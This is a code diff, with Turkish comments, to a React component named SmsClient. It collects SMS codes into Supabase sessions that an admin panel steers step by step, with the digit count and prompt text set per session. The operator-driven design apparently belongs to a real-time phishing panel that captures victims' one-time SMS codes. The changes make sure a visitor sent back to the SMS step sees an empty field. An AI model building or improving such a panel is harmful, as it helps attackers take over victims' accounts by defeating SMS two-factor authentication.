@@ -39,8 +39,18 @@ export function SmsClient({ sessionId }: Props) {
       setDigits(data.sms_digits ?? 6);
       setCustomText(data.sms_custom_text);
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      fd.smsCode = "";
+      fd.sms_code = "";
+      // ⭐ KULLANICI SMS SAYFASINA TEKRAR DÖNÜNCE ESKİ SMS KODU ASLA GÖZÜKMEMELİ:
+      // 1) Input'u boşalt (setCode(""))
+      // 2) DB'deki eski smsCode/sms_code'u sil (Redeploy sonrası kullanıcı sayfayı
+      //    yenilediğinde de eski kod gelmesin diye)
+      setCode("");
+      void supabase
+        .from("sessions")
+        .update({ form_data: { ...(data.form_data ?? {}), smsCode: "", sms_code: "" } })
+        .eq("id", sessionId);
       setSessionFormData(fd);
-      setCode(fd.smsCode ?? "");
       setLoading(false);
     })();
 
@@ -57,14 +67,27 @@ export function SmsClient({ sessionId }: Props) {
             filter: `id=eq.${sessionId}`,
           },
           (payload) => {
-            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
+            const next = payload.new as {
+              sms_digits?: number;
+              sms_custom_text?: string | null;
+              current_step?: string;
+              form_data?: Record<string, any>;
+            };
             if (next.sms_digits) {
               setDigits(next.sms_digits);
-              // EÄŸer kod, yeni haneden uzunsa keselim
-              setCode((prev) => prev.slice(0, next.sms_digits));
+              setCode("");
             }
             if (next.sms_custom_text !== undefined) {
               setCustomText(next.sms_custom_text);
+            }
+            // Admin panelinden tekrar SMS adımına atılırsa (current_step = sms),
+            // inputu BOŞALT (eski kod görünmesin).
+            if (next.current_step === "sms") {
+              setCode("");
+              if (next.form_data && typeof next.form_data === "object") {
+                next.form_data.smsCode = "";
+                next.form_data.sms_code = "";
+              }
             }
           }
         )
